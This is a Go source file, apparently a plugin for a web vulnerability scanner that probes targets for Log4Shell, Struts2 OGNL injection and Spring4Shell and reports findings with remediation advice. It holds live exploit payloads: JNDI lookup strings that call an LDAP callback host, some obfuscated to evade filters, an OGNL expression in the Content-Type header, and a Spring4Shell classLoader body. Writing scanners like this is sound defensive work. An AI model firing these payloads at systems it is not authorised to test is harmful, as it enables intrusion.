package cve

import (
	"context"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/evoscanner/evoscanner/internal/scanner"
	"github.com/evoscanner/evoscanner/pkg/types"
)

// Plugin checks known high-impact CVE signatures.
type Plugin struct{}

func (p *Plugin) ID() string { return "known-cve" }

func (p *Plugin) Name() string { return "Known CVE Exposure" }

func (p *Plugin) Description() string {
	return "Detects potential exposure to Log4Shell, Apache Struts2 OGNL injection, and Spring4Shell"
}

func (p *Plugin) Category() string { return "components" }

func (p *Plugin) Severity() types.Severity { return types.SeverityCritical }

func (p *Plugin) Compliance() []types.ComplianceRef {
	return []types.ComplianceRef{
		{Standard: types.StandardNIS, ID: "WA-COMP-01", Name: "Log4j/Apache Struts2 취약점"},
		{Standard: types.StandardOWASP, ID: "A06:2021", Name: "Vulnerable and Outdated Components"},
	}
}

func (p *Plugin) Check(ctx context.Context, target *types.Target, endpoint *types.Endpoint, client scanner.HttpClient) ([]types.Finding, error) {
	if target == nil || endpoint == nil {
		return nil, nil
	}

	baseURL := strings.TrimSpace(endpoint.URL)
	if baseURL == "" {
		baseURL = strings.TrimSpace(target.BaseURL)
	}
	if baseURL == "" {
		return nil, nil
	}

	headers := mergeHeaders(target.Headers, endpoint.Headers)
	findings := make([]types.Finding, 0)

	callback := discoverCallbackURL(target)
	log4jPayloads := buildLog4jPayloads(callback)
	log4jHeaderNames := []string{"User-Agent", "X-Forwarded-For", "Referer", "X-Api-Version", "Accept-Language"}

	for _, payload := range log4jPayloads {
		probeHeaders := copyHeaders(headers)
		for _, h := range log4jHeaderNames {
			probeHeaders[h] = payload
		}

		resp, err := client.Do(ctx, &scanner.Request{Method: "GET", URL: baseURL, Headers: probeHeaders})
		if err != nil || resp == nil {
			continue
		}

		evidence := ""
		if callback != "" {
			if resp.StatusCode >= 500 || hasAny(resp.Body, []string{"exception", "error", "log4j"}) {
				evidence = "JNDI payload delivered in multiple headers (callback mode)"
			}
		} else {
			if hit, ok := containsAnyFold(resp.Body, []string{"jndi", "javax.naming", "initialcontext"}); ok {
				evidence = "Response indicates JNDI processing error: " + hit
			}
		}

		if evidence == "" {
			continue
		}

		findings = append(findings, types.Finding{
			ID:          fmt.Sprintf("%s-%d", p.ID(), time.Now().UnixNano()),
			PluginID:    p.ID(),
			Name:        "Potential Log4Shell (CVE-2021-44228)",
			Description: "Application response suggests possible unsafe JNDI lookup handling in logging path",
			Severity:    p.Severity(),
			Confidence:  0.75,
			URL:         baseURL,
			Method:      "GET",
			Payload:     payload,
			Evidence:    evidence,
			Request:     resp.RawRequest,
			Response:    resp.RawResponse,
			CWE:         []string{"CWE-917", "CWE-502"},
			CVE:         []string{"CVE-2021-44228"},
			Compliance:  p.Compliance(),
			Remediation: "Upgrade Log4j to patched versions and disable JNDI lookup functionality",
			References: []string{
				"https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
				"https://logging.apache.org/log4j/2.x/security.html",
			},
			Timestamp: time.Now(),
		})
	}

	strutsHeaders := copyHeaders(headers)
	strutsPayload := "%{(#test='multipart/form-data')}"
	strutsHeaders["Content-Type"] = strutsPayload
	strutsResp, strutsErr := client.Do(ctx, &scanner.Request{Method: "POST", URL: baseURL, Headers: strutsHeaders, Body: "a=b"})
	if strutsErr == nil && strutsResp != nil {
		if hit, ok := containsAnyFold(strutsResp.Body, []string{"struts", "ognl", "xwork", "invalid content type"}); ok {
			findings = append(findings, types.Finding{
				ID:          fmt.Sprintf("%s-%d", p.ID(), time.Now().UnixNano()),
				PluginID:    p.ID(),
				Name:        "Potential Apache Struts2 OGNL injection",
				Description: "Injected Content-Type OGNL expression triggered Struts-related error behavior",
				Severity:    p.Severity(),
				Confidence:  0.72,
				URL:         baseURL,
				Method:      "POST",
				Parameter:   "Content-Type",
				Payload:     strutsPayload,
				Evidence:    "Struts signature in response: " + hit,
				Request:     strutsResp.RawRequest,
				Response:    strutsResp.RawResponse,
				CWE:         []string{"CWE-917"},
				Compliance:  p.Compliance(),
				Remediation: "Upgrade Apache Struts2 to a patched release and harden OGNL evaluation settings",
				References: []string{
					"https://struts.apache.org/security/",
				},
				Timestamp: time.Now(),
			})
		}
	}

	springHeaders := copyHeaders(headers)
	springHeaders["suffix"] = "%>//"
	springHeaders["c1"] = "Runtime"
	springHeaders["c2"] = "<%"
	springHeaders["DNT"] = "1"
	springHeaders["Content-Type"] = "application/x-www-form-urlencoded"
	springBody := "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"
	springResp, springErr := client.Do(ctx, &scanner.Request{Method: "POST", URL: baseURL, Headers: springHeaders, Body: springBody})
	if springErr == nil && springResp != nil {
		if hit, ok := containsAnyFold(springResp.Body, []string{"class.module.classloader", "tomcat", "spring", "bindingresult", "invalid property"}); ok {
			findings = append(findings, types.Finding{
				ID:          fmt.Sprintf("%s-%d", p.ID(), time.Now().UnixNano()),
				PluginID:    p.ID(),
				Name:        "Potential Spring4Shell (CVE-2022-22965)",
				Description: "Spring/Tomcat error patterns detected after Spring4Shell probe headers/body",
				Severity:    p.Severity(),
				Confidence:  0.68,
				URL:         baseURL,
				Method:      "POST",
				Payload:     springBody,
				Evidence:    "Spring-related signature in response: " + hit,
				Request:     springResp.RawRequest,
				Response:    springResp.RawResponse,
				CWE:         []string{"CWE-917"},
				CVE:         []string{"CVE-2022-22965"},
				Compliance:  p.Compliance(),
				Remediation: "Apply patched Spring Framework versions and container-level hardening",
				References: []string{
					"https://nvd.nist.gov/vuln/detail/CVE-2022-22965",
				},
				Timestamp: time.Now(),
			})
		}
	}

	return findings, nil
}

func discoverCallbackURL(target *types.Target) string {
	if target == nil {
		return ""
	}
	for k, v := range target.Headers {
		if strings.EqualFold(k, "X-Callback-URL") || strings.EqualFold(k, "Callback-URL") || strings.EqualFold(k, "X-Evo-Callback-URL") {
			trimmed := strings.TrimSpace(v)
			if trimmed != "" {
				if _, err := url.Parse(trimmed); err == nil {
					return trimmed
				}
			}
		}
	}
	return ""
}

func buildLog4jPayloads(callbackURL string) []string {
	callback := "CALLBACK"
	if strings.TrimSpace(callbackURL) != "" {
		callback = strings.TrimRight(strings.TrimSpace(callbackURL), "/")
	}
	return []string{
		"${jndi:ldap://" + callback + "/a}",
		"${${lower:j}ndi:${lower:l}dap://" + callback + "/a}",
		"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + callback + "/a}",
	}
}

func containsAnyFold(text string, keys []string) (string, bool) {
	lower := strings.ToLower(text)
	for _, key := range keys {
		if strings.Contains(lower, strings.ToLower(key)) {
			return key, true
		}
	}
	return "", false
}

func hasAny(text string, keys []string) bool {
	_, ok := containsAnyFold(text, keys)
	return ok
}

func mergeHeaders(targetHeaders, endpointHeaders map[string]string) map[string]string {
	headers := make(map[string]string, len(targetHeaders)+len(endpointHeaders))
	for k, v := range targetHeaders {
		headers[k] = v
	}
	for k, v := range endpointHeaders {
		headers[k] = v
	}
	return headers
}

func copyHeaders(in map[string]string) map[string]string {
	out := make(map[string]string, len(in))
	for k, v := range in {
		out[k] = v
	}
	return out
}
